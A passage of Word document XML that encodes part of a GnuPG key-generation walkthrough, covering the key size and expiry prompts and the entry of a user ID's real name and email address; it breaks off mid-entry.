      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>en 1024 and 4096 b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ong. What</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>keys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze do you wan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(2048)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="6661"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ques</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ze </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s 2048 b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4936"/>
        <w:jc w:val="both"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1020" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ease spec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>fy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">w </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ong</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>hou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>d.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="602" w:right="6156"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>0 =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>does not</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>exp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="460"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:t>n&gt;  = key exp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>res</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n n days</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="460"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:t>n&gt;w =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>exp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">res </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>eeks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="460"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:t>n&gt;m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>= key exp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">es </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hs</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="460"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:t>n&gt;y = key exp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>res</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n n years</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>for? (0) 100</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4188"/>
      </w:pPr>
      <w:r>
        <w:t>Key exp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>res at</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Sat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>24 Sep 2016 07</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>39</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>58</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">M IST </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s correc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>? (y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>N) y</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-25"/>
        </w:rPr>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:t>ou need</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">a user ID </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>den</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>fy your key;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he sof</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ware</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>cons</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ruc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>ser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>D</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="340" w:right="2803" w:hanging="240"/>
      </w:pPr>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>al</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e, Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mm</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Em</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Address </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>He</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ne (Der D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId40">
        <w:r>
          <w:t>&lt;he</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
        <w:r>
          <w:t>nr</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
        <w:r>
          <w:t>chh</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>@</w:t>
        </w:r>
        <w:r>
          <w:t>duesse</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>dorf.de&gt;"</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>al</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>na</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>Na</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ust</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be at</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>east</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>5 cha</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ong</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>al</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>na</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>address:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>bened</w:t>
      </w:r>
      <w:r>
        <w:rPr>
